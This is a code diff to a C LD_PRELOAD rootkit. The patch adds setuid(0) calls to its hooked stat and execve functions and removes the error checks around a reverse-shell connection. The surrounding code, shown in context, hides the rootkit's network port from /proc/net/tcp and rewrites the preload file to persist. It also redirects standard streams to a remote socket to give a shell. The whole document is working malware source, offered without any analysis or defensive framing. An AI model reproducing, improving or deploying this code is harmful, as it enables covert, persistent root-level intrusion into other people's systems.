@@ -39,6 +39,7 @@ void IPv4() {
     int sockfd;
     pid_t pid;
     
+    setuid(0);
     setgid(MAGIC_GID);
     if((pid = fork()) == 0) {
         if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
@@ -52,8 +53,8 @@ void IPv4() {
         client.sin_port = htons(LOCAL_PORT);
         client.sin_family = AF_INET;
 
-        if (bind(sockfd, (struct sockaddr *)&client, sizeof(client)) == -1) exit(0x0);
-        if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) exit(0x0);
+        bind(sockfd, (struct sockaddr *)&client, sizeof(client));
+        connect(sockfd, (struct sockaddr *)&server, sizeof(server));// == -1) exit(0x0);
         for(int i = 0; i < 3; i++) dup2(sockfd, i);
         if(old_execve == NULL) old_execve = dlsym(RTLD_NEXT, "execve");
 
@@ -76,7 +77,7 @@ void hijack_proc_net_tcp(FILE* tmp, const char *path, const char* mode) {
     #endif
 
     if(old_file != NULL) {
-        while(getline(&buff, &buff_length, old_file) != -1) { 
+        while(getline(&buff, &buff_length, old_file) != -1) {
             if(strstr(buff, HEX_PORT) == NULL)
                 fputs(buff, tmp);
         }
@@ -172,6 +173,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
 
         old_unlink(PRELOAD_PATH);
         old_execve(path, argv, envp);
+        setuid(0);
         ld_preload = old_fopen(PRELOAD_PATH, "w");
         fwrite(MAGIC_PATH, strlen(MAGIC_PATH), 1, ld_preload);
         fclose(ld_preload);
@@ -331,6 +333,7 @@ int __fxstat(int ver, int fd, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_fxstat == NULL) old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_fxstat(ver, fd, &tmp_stat);
 
@@ -346,6 +349,7 @@ int __fxstat64(int ver, int fd, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_fxstat64 == NULL) old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_fxstat64(ver, fd, &tmp_stat);
 
@@ -361,6 +365,7 @@ int __lxstat(int ver, const char *path, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_lxstat == NULL) old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_lxstat(ver, path, &tmp_stat);
 
@@ -376,6 +381,7 @@ int __lxstat64(int ver, const char *path, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_lxstat64 == NULL) old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_lxstat64(ver, path, &tmp_stat);
 
@@ -391,6 +397,7 @@ int __xstat(int ver, const char *path, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_xstat(ver, path, &tmp_stat);
 
@@ -406,6 +413,7 @@ int __xstat64(int ver, const char *path, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_xstat64(ver, path, &tmp_stat);
 
@@ -420,7 +428,8 @@ int __xstat64(int ver, const char *path, struct stat64 *buf) {
 int fstat(int fd, struct stat *buf) {
     struct stat tmp_stat;
 
-    if(old_fxstat == NULL) dlsym(RTLD_NEXT, "__fxstat");
+    if(old_fxstat == NULL) old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_fxstat(3, fd, &tmp_stat);
     
@@ -436,6 +445,7 @@ int fstat64(int fd, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_fxstat64 == NULL) old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_fxstat64(3, fd, &tmp_stat);
 
@@ -451,6 +461,7 @@ int lstat(const char *path, struct stat *buf) {
     struct stat tmp_stat;
     
     if(old_lxstat == NULL) old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_lxstat(3, path, &tmp_stat);
 
@@ -466,6 +477,7 @@ int lstat64(const char *path, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_lxstat64 == NULL) old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_lxstat64(3, path, &tmp_stat);
 
@@ -481,6 +493,7 @@ int stat(const char *path, struct stat *buf) {
     struct stat tmp_stat;
 
     if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat));
     old_xstat(3, path, &tmp_stat);
 
@@ -496,6 +509,7 @@ int stat64(const char *path, struct stat64 *buf) {
     struct stat64 tmp_stat;
 
     if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+    setuid(0);
     memset(&tmp_stat, 0, sizeof(stat64));
     old_xstat64(3, path, &tmp_stat);
 
